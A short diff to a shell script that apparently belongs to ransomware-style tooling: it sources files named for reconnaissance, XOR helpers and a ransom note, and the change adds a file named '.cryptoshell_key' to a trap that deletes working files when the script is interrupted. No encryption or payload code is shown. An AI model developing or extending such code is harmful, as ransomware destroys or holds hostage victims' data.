@@ -4,7 +4,7 @@ source recon.sh
 source xor_helper.sh
 source ransom_note.sh
 
-trap "rm -f target.list ransom_note.txt .cs_count" SIGINT SIGTERM 2>/dev/null
+trap "rm -f target.list ransom_note.txt .cs_count .cryptoshell_key" SIGINT SIGTERM 2>/dev/null
 
 if [ -f .cs_count ]; then
     count=$(<.cs_count)
